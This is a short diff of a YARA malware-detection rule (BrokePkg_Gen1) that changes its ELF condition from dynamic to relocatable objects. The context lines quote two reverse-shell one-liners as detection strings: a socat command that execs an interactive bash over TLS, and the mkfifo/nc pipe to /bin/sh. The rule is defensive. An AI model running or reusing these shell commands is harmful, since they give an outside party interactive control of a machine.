@@ -62,7 +62,7 @@ rule BrokePkg_Gen1 {
     $ = "socat openssl-connect:%s:%s,verify=0 exec:'bash -li',pty,stderr,setsid,sigint,sane" fullword ascii
     $ = "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f" fullword ascii
   condition:
-    elf_dyn and
+    elf_rel and
     (
       for 3 i in (0 .. elf.dynsym_entries):
       (
